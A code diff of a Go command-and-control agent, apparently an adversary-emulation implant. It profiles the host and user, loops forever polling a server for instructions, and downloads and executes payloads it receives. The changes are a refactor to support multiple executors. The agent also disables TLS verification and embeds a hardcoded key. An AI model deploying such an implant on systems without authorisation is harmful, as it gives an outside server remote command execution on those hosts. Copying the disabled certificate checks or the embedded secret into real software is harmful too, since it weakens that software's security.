@@ -2,23 +2,24 @@ package main
 
 import (
 	"crypto/tls"
-	"fmt"
 	"flag"
+	"fmt"
 	"net/http"
 	"os"
 	"os/user"
-	"time"
 	"reflect"
 	"runtime"
 	"strconv"
+	"time"
+
 	"./api"
-	"./util"
 	"./execute"
+	"./util"
 )
 
 var iteration = 60
 
-func askForInstructions(profile map[string]string) {
+func askForInstructions(profile map[string]interface{}) {
 	commands := api.Instructions(profile)
 	if commands != nil && len(commands.([]interface{})) > 0 {
 		cmds := reflect.ValueOf(commands)
@@ -26,7 +27,7 @@ func askForInstructions(profile map[string]string) {
 			cmd := cmds.Index(i).Elem().String()
 			fmt.Println("[*] Running instruction")
 			command := util.Unpack([]byte(cmd))
-			api.Drop(profile["server"], command["payload"].(string))
+			api.Drop(profile["server"].(string), command["payload"].(string))
 			api.Execute(profile, command)
 		}
 	} else {
@@ -34,23 +35,37 @@ func askForInstructions(profile map[string]string) {
 	}
 }
 
-func buildProfile(server string, group string, executor string) map[string]string {
+func buildProfile(server string, group string, executors []string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 	paw := fmt.Sprintf("%s$%s", host, user.Username)
-	return map[string]string{"paw": paw, "server": server, "group": group, "platform": runtime.GOOS, "executor": executor, 
-		"location": os.Args[0], "pid": strconv.Itoa(os.Getpid()), "ppid": strconv.Itoa(os.Getppid()) } 
+	profile := make(map[string]interface{})
+	profile["paw"] = paw
+	profile["server"] = server
+	profile["group"] = group
+	profile["architecture"] = runtime.GOARCH
+	profile["platform"] = runtime.GOOS
+	profile["location"] = os.Args[0]
+	profile["pid"] = strconv.Itoa(os.Getpid())
+	profile["ppid"] = strconv.Itoa(os.Getppid())
+	profile["executors"] = executors
+	return profile
 }
 
 func main() {
+	var executors execute.ExecutorFlags
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
 	group := flag.String("group", "my_group", "Attach a group to this agent")
-	executor := flag.String("executor", execute.DetermineExecutor(runtime.GOOS), "Attach a group to this agent")
+	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
 	flag.Parse()
-
-	profile := buildProfile(*server, *group, *executor)
-	for { askForInstructions(profile) }
+	if executors == nil {
+		executors = []string{execute.DetermineExecutor(runtime.GOOS)}
+	}
+	profile := buildProfile(*server, *group, executors)
+	for {
+		askForInstructions(profile)
+	}
 }
 
-var key = "3TEU4UD15V29OBJB7U9HNCR2JPWL1U"
+var key = "9QRJPI8IVTUCXO14RSSJBR29ZUSBWV"
